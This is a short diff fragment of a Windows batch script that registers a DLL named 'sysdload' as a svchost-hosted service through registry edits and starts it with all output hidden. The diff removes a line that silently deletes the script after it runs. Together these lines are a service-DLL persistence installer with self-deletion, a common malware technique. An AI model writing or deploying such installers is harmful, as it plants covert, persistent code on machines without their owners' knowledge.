@@ -30,5 +30,3 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v sysdload 
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\sysdload\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\sysdload.dll" /f > nul
 
 sc start sysdload > nul
-
-del /f /q "%~dpnx0" > nul
